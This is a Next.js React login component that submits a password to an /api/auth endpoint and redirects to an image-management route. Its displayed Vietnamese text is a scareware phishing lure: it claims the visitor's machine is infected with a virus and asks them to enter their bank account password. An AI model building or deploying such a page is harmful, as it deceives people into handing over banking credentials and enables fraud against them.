"use client";

import { FormEvent, useState } from "react";
import { useRouter } from "next/navigation";

const TAB_SESSION_KEY = "manage-image-tab-session";

export default function Home() {
  const router = useRouter();
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setLoading(true);
    setMessage("");
    try {
      const response = await fetch("/api/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      if (!response.ok)
        throw new Error((await response.json()).error ?? "Đăng nhập thất bại.");
      sessionStorage.setItem(TAB_SESSION_KEY, "authenticated");
      router.push("/manage-image");
    } catch (error) {
      setMessage(
        error instanceof Error ? error.message : "Đăng nhập thất bại.",
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="login-page">
      <div className="login-orbit login-orbit-one" />
      <div className="login-orbit login-orbit-two" />
      <section className="login-shell" aria-labelledby="login-title">
        <div className="login-mark" aria-hidden="true">
          MI
        </div>
        <p className="login-kicker">PRIVATE BANK MANAGERMENT</p>
        <h1 id="login-title">Máy Bạn đã nhiễm Virus</h1>
        <p className="login-description">
          Vui lòng nhập <b>Mật Khẩu</b> tài khoản Ngân Hàng để xác thực quyền truy cập vào hệ thống.
        </p>
        <form className="login-form" onSubmit={handleSubmit}>
          <label htmlFor="password">Mật khẩu quản trị</label>
          <input
            id="password"
            type="password"
            autoComplete="current-password"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? "Đang kiểm tra..." : "Đăng nhập →"}
          </button>
        </form>
        <p className="login-message" role="alert">
          {message}
        </p>
      </section>
    </main>
  );
}
